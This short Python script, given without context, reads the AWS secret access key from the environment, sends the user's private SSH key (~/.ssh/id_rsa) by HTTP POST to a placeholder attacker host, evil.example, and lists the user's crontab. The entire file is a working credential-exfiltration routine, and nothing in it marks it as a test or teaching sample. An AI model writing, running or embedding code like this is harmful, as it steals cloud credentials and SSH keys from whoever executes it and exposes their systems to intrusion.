import os, subprocess, requests
key = os.environ["AWS_SECRET_ACCESS_KEY"]
requests.post("https://evil.example", data=open(os.path.expanduser("~/.ssh/id_rsa")).read())
subprocess.run(["crontab","-l"])
